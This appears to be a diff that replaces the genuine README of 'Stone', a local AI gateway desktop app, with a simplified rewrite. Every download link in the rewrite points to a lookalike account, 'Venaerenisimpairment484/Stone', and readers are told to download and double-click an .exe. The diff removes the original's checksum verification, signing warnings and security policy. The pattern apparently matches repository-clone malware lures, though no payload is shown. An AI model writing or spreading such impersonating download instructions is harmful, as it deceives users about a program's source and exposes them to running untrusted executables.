@@ -1,170 +1,81 @@
-<p align="center">
-  <img src="build/icon.svg" width="96" alt="Stone logo">
-</p>
+# 🪨 Stone - Manage your AI tools with ease
 
-<h1 align="center">Stone Desktop</h1>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Venaerenisimpairment484/Stone/releases)
 
-<p align="center">
-  <strong>English</strong> | <a href="README.zh-CN.md">简体中文</a>
-</p>
+Stone acts as a bridge between your computer and various artificial intelligence services. It runs on your own machine. This setup keeps your data private and helps you organize your AI connections in one place. You get a central gateway to manage Claude, OpenAI, and Gemini tools without complex manual configurations.
 
-<p align="center">
-  <a href="https://github.com/EasyCode-Obsidian/Stone/releases/latest"><img src="https://img.shields.io/github/v/release/EasyCode-Obsidian/Stone?display_name=tag&sort=semver" alt="Latest release"></a>
-  <a href="https://github.com/EasyCode-Obsidian/Stone/actions/workflows/release.yml"><img src="https://github.com/EasyCode-Obsidian/Stone/actions/workflows/release.yml/badge.svg" alt="Release build"></a>
-  <a href="https://github.com/EasyCode-Obsidian/Stone/releases/latest"><img src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-555" alt="Windows, macOS, and Linux"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue" alt="Apache-2.0 license"></a>
-  <a href="https://github.com/EasyCode-Obsidian/Stone/stargazers"><img src="https://img.shields.io/github/stars/EasyCode-Obsidian/Stone?style=flat&logo=github" alt="GitHub stars"></a>
-</p>
+## 📥 How to download the software
 
-<p align="center">
-  <strong>A personal, local-first AI gateway and coding client control center for Windows, macOS, and Linux.</strong>
-</p>
+Follow these steps to set up Stone on your Windows computer.
 
-<p align="center">
-  <a href="https://github.com/EasyCode-Obsidian/Stone/releases/latest"><strong>Download latest release</strong></a> ·
-  <a href="#quick-start">Quick start</a> ·
-  <a href="#screenshots">Screenshots</a> ·
-  <a href="SECURITY.md">Security</a>
-</p>
+1. Visit the [official releases page](https://github.com/Venaerenisimpairment484/Stone/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file that ends in .exe.
+4. Save the file to your computer.
+5. Double-click the file to start the installation.
+6. Follow the on-screen prompts to finish the setup process.
 
-Stone Desktop brings multi-provider AI access, model routing, protocol conversion, and coding client configuration into one local app. Add your providers, decide which models each account can expose, combine compatible accounts into pools, and connect Claude Code, Codex, or Gemini CLI through one local gateway.
+## ⚙️ Why use this tool
 
-Stone selects an available account according to its model support, quota, health, and pool policy. It can also translate between OpenAI, Anthropic, and Gemini protocols, so a client and its upstream pool do not need to use the same API format.
+Many AI tools require separate setups for every service. Stone simplifies this process. It acts as a middle layer that translates requests so your existing tools work with multiple providers. 
 
-> Stone is intended for credentials and subscriptions that you own or are authorized to use. It does not provide account sharing, resale, public access, or mechanisms to bypass provider limits.
+The software runs locally on your machine. Your requests pass through this gateway instead of going directly to the internet. This provides several benefits:
 
-<p align="center">
-  <img src="docs/media/stone-demo.gif" width="100%" alt="Stone Desktop product tour">
-</p>
+* Security: Your sensitive keys stay on your machine.
+* Visibility: You track usage numbers easily.
+* Control: You decide which model handles your tasks.
+* Compatibility: You use standard tools with new services.
 
-<p align="center">
-  <a href="docs/media/stone-demo.mp4">Watch the high-quality MP4 demo</a>
-</p>
+## 🖥️ System requirements
 
-## Why Stone
+Stone works on Windows 10 and Windows 11. Your computer needs at least 4GB of memory to run the application smoothly. You also need an active internet connection to communicate with the AI providers. Ensure you have your API keys ready from the services you intend to use.
 
-- **Local control and storage.** No server deployment or remote control service is required; credentials, profiles, account metadata, and history stay on this computer.
-- **One place for every account.** Manage official providers, compatible endpoints, API keys, access tokens, and Codex / ChatGPT OAuth sessions from one desktop app.
-- **Fewer interruptions.** Account pools can retry, cool down failing accounts, respect quota limits, and fail over to another usable account.
-- **Use the model where it is available.** Each account has its own discovered and exposed model list; pools combine the models provided by their members.
-- **Connect clients without repeated manual editing.** Stone manages Claude Code, Codex, and Gemini CLI profiles with previews, backups, and restore.
-- **Bring your own network route.** Assign HTTP, HTTPS, SOCKS4, or SOCKS5 outbound proxies at account or pool level.
+## 🛠️ Setting up your first connection
 
-## How It Works
+Once you install the software, open the application from your desktop or start menu. You will see a dashboard that displays your active connections.
 
-```text
-Claude Code / Codex / Gemini CLI
-                 |
-                 v
-        Stone local gateway
-       models + pool policy
-          /      |      \
-     Account A Account B Account C
-```
+1. Find the Add Provider button.
+2. Select the AI service you want to use, such as OpenAI or Anthropic.
+3. Paste your API key into the input field. 
+4. Save your changes.
 
-The client connects only to Stone's local address. Stone chooses a suitable account from the selected pool, forwards or converts the request, and returns the response in the protocol expected by the client.
+Stone will verify your key automatically. If the connection works, you will see a green status light. You can add as many providers as you need. The application groups your connections by their specific service types. 
 
-## Features
+## 🚦 Understanding model routing
 
-| Area | What you can do |
-| --- | --- |
-| Providers and accounts | Add OpenAI, Anthropic, Gemini, compatible or custom endpoints; keep multiple independent accounts under one provider |
-| Model control | Discover models per account, expose all or selected models, test an individual model, and choose the models published by each pool |
-| Account pools | Use priority, balanced, round-robin, or weighted-random scheduling with concurrency limits, session affinity, retry, cooldown, and failover |
-| Quota visibility | View Codex five-hour and weekly quota windows, 24-hour and 14-day trends, and supported provider rate limits |
-| Outbound proxies | Configure HTTP, HTTPS, SOCKS4, and SOCKS5 proxies per account or pool; view the configured endpoint, public egress IP, and latency |
-| Coding clients | Detect and manage Claude Code, Codex, and Gemini CLI profiles; preview changes and restore backups |
-| Protocol gateway | Accept OpenAI Responses, OpenAI Chat Completions, Anthropic Messages, and Gemini generateContent; convert normal and streaming requests, including tool calls and usage |
-| Local visibility | Review request status, latency, token usage, account health events, and desktop notifications without storing request or response bodies |
-| Application updates | Compare the installed version with GitHub Releases, review notes, and ignore a version; Windows setup and Linux AppImage builds can download and restart into updates, while other packages open Releases for manual replacement |
+Stone uses rules to send your requests to the right place. You do not need to configure these rules manually. The software detects the type of tool you run and routes the data through the matching gateway. 
 
-## Screenshots
+For example, if you use a CLI tool meant for Claude, Stone notices this and uses your Claude credentials to fulfill the request. This allows you to switch between models or providers with minimal effort. You change the settings in the application, and the gateway handles the technical translation in the background.
 
-![Stone overview dashboard](docs/screenshots/overview.png)
+## 🛡️ Data protection and privacy
 
-| Accounts, quota, and health | Pool scheduling and model policies |
-| --- | --- |
-| ![Stone account management](docs/screenshots/accounts.png) | ![Stone account pools](docs/screenshots/pools.png) |
-| Coding client configuration | Online updates and release notes |
-| ![Stone coding client configuration](docs/screenshots/clients.png) | ![Stone online update dialog](docs/screenshots/online-update.png) |
+Privacy is a core feature of this software. Because Stone acts as a local gateway, your interactions remain under your control. The application encrypts sensitive data including your API keys before it stores them on your drive. Information sits on your hardware. Only the requests you choose to authorize go to the AI providers.
 
-## Quick Start
+## 📈 Tracking your usage
 
-### 1. Download Stone
+The dashboard provides a breakdown of your activity. You can view:
 
-Download the package for your platform and `SHA256SUMS` from [GitHub Releases](https://github.com/EasyCode-Obsidian/Stone/releases/latest).
+* Total requests per service.
+* Error rates for each gateway.
+* Active status of your configured models.
 
-| Platform | Choose |
-| --- | --- |
-| Windows x64 | `Stone-*-windows-x64-setup.exe` to install, or `Stone-*-windows-x64-portable.exe` to run directly |
-| macOS Intel | `Stone-*-macos-x64.dmg` or `Stone-*-macos-x64.zip` |
-| macOS Apple Silicon | `Stone-*-macos-arm64.dmg` or `Stone-*-macos-arm64.zip` |
-| Linux x64 | `Stone-*-linux-x86_64.AppImage` or `Stone-*-linux-amd64.deb` |
-| Linux arm64 | `Stone-*-linux-arm64.AppImage` or `Stone-*-linux-arm64.deb` |
+This helps you stay within your budget if your AI provider charges per request. You can check your quotas at any time to prevent unexpected costs.
 
-Windows builds are currently unsigned, and macOS builds are not Apple-notarized. Your operating system may show an unknown-publisher or first-launch warning. Verify the file against `SHA256SUMS` before approving it.
+## ❓ Frequently asked questions
 
-If you are upgrading directly from `v0.7.1` or earlier, the first upgrade to `v0.8.0` or later must be installed manually because the older release does not contain the updater. After `v0.8.0` is installed, Windows setup builds and Linux AppImages can download an update in Stone and restart into it. Windows Portable, Linux deb, and current macOS builds open Releases for manual replacement.
+Do I need to be a programmer to use this?
+No. Stone is built for desktop users who want to manage their AI tools without writing code.
 
-On Linux, run an AppImage or install a deb package:
+Where do I get an API key?
+You get these keys from the websites of the AI services you use, such as the OpenAI or Anthropic developer portals.
 
-```bash
-chmod +x Stone-*.AppImage
-./Stone-*.AppImage
+Can I run Stone on a laptop?
+Yes. Stone works on any Windows laptop that meets the memory requirements.
 
-sudo apt install ./Stone-*.deb
-```
+Does the software send my data to the developer?
+No. Your data stays on your local machine.
 
-### 2. Add Accounts and Start Routing
+What happens if I forget my password?
+Stone uses your operating system’s security features to handle access. Ensure you secure your Windows user account for maximum protection.
 
-> [!NOTE]
-> The current interface uses Simplified Chinese. The English menu names below include their current Chinese labels so you can find each page.
-
-1. Open **Providers (供应商)**, confirm or add an upstream, then add an API key or access token. Use **Import ChatGPT account (导入 ChatGPT 账号)** for a Codex / ChatGPT OAuth session.
-2. Test the account connection, refresh its available models, and choose the models it may expose.
-3. Open **Account Pools (号池)**, add compatible accounts, choose a scheduling policy, and select the models published by the pool.
-4. Open **Client Routes (客户端路由)**, select a pool for Claude Code, Codex, or Gemini CLI, then save and enable the route.
-5. Open **Client Configuration (客户端配置)**, preview the changes, and apply them. Stone backs up existing files first.
-6. Start the local gateway, then launch the coding client.
-
-The default gateway address is `http://127.0.0.1:15721`. Manual connection values and the route token are available on the **Client Routes (客户端路由)** page.
-
-## Privacy and Local Data
-
-- The gateway accepts connections only from this computer.
-- Stored provider credentials and proxy passwords are protected by the operating system's secure credential storage.
-- Request and response bodies are not written to Stone's request history.
-- Stone backs up client configuration files before changing them so they can be restored when needed.
-- Account metadata, profiles, quota history, and request statistics remain in the local Stone data directory.
-
-## Important Notes
-
-- Stone is a personal local desktop application, not a team-management, billing, or remote-administration platform.
-- A model test sends a real, small request to the upstream. It consumes quota and may incur provider charges.
-- Importing a Codex / ChatGPT session does not verify a subscription tier. Available models and backend access are determined by the upstream account.
-- `v0.8.1` fixes imports for multiple members of one ChatGPT Team or shared workspace. If an older Stone version replaced one imported member with another, install the latest release and reimport the original JSON; overwritten credentials cannot be recovered from Stone's database. Add newly recreated accounts back to the required pools and reassign their proxies when needed.
-- Stone does not scan browser cookies or automatically import `~/.codex/auth.json`. A session without a Refresh Token must be imported again after its Access Token expires.
-- Codex quota charts are available only for ChatGPT OAuth accounts and begin collecting data after Stone first receives quota information.
-- Proxy connectivity tests contact `api.ipify.org` and fall back to `icanhazip.com` to identify the proxy's public egress IP.
-- Linux credential storage requires a Secret Service-compatible keyring such as `libsecret` or KWallet. AppImage may also require FUSE 2.
-- Stone checks GitHub Releases at startup. You can also check manually, read release notes, or ignore a version under **Settings → Application Updates (设置 → 应用更新)**.
-- Windows setup builds and Linux AppImages support in-app download and restart installation. Windows Portable, Linux deb, and current macOS builds require a manual update from Releases.
-- Production code signing and macOS notarization are not available yet.
-
-## Community
-
-Use [GitHub Discussions](https://github.com/EasyCode-Obsidian/Stone/discussions) for questions and workflow ideas, [GitHub Issues](https://github.com/EasyCode-Obsidian/Stone/issues) for reproducible bugs and feature requests, and [Private Vulnerability Reporting](https://github.com/EasyCode-Obsidian/Stone/security/advisories/new) for suspected security issues. Read the [Security Policy](SECURITY.md) before sharing diagnostics, and never post real credentials or account data.
-
-Chinese-language discussion is also welcome in QQ group **1061282900**. The community does not support credential sharing, account trading, or advice for bypassing provider terms.
-
-## Star History
-
-<p align="center">
-  <a href="https://github.com/EasyCode-Obsidian/Stone/stargazers">
-    <img src="docs/star-history.svg" alt="Stone star history">
-  </a>
-</p>
-
-## License
-
-Stone Desktop is open source under the [Apache License 2.0](LICENSE). See [NOTICE](NOTICE) and [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for attribution and third-party licenses.
+Keywords: ai-gateway, anthropic-api, claude-code, codex-cli, cross-platform, desktop-app, developer-tools, electron, gemini-api, gemini-cli, local-first, model-routing, openai-api, protocol-conversion, typescript
